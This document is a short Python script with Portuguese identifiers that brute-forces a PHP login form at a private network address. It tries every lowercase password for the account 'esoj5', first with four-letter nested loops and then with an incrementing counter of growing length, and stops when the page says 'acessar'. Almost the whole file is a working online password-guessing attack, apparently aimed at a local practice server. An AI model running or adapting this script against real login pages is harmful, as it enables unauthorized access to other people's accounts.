#!/usr/bin/python3.7
import time
"""<form method="POST" action="login_process.php">
  Username:<br>
  <input type="text" name="username"><br>
  Password:<br>
  <input type="text" name="password"><br><br>
  <input type="submit" value="Submit">
</form>"""



import requests
#http for humans, pff import socket and write http on hand is much better


def tryPasswd(username,password):

    url="http://192.168.0.49:8080/login_process.php"
    obj= {'username':username,'password':password}
    x = requests.post(url,data=obj)
    return x.text

def guessPasswd(username):
    resposta=""
    
    alfabeto="abcdefghijklmnopqrstuvwxyz"
    
    for l1 in alfabeto:
        for l2 in alfabeto:
            for l3 in alfabeto:
                for l4 in alfabeto:
                    #for l5 in alfabeto:
                    chute=l1+l2+l3+l4
                    print("chutando senha: %s"%chute)
                    resposta = tryPasswd(username,chute)
                    if "acessar" in resposta:
                        print("------------------------")
                        print("senha encontrada: %s"%chute)
                        print("------------------------")
                        return


def add(chute,indice):
    if indice==-1:
        chute.insert(0,"a")
        return

    chute[indice]=chr(ord(chute[indice])+1)
    if chute[indice]=="{":
        chute[indice]="a"
        add(chute,indice-1)

def guessPasswd2(username):
    resposta=""
    
    chute=["a"]
    while True:
   
        
        chuteStr="".join(chute)
        resposta = tryPasswd(username,chuteStr)
        print("chutando %s"%chuteStr)
        if "acessar" in resposta:
            print("------------------------")
            print("senha encontrada: %s"%chuteStr)
            print("------------------------")
            break
        
        add(chute,len(chute)-1)



guessPasswd2("esoj5")
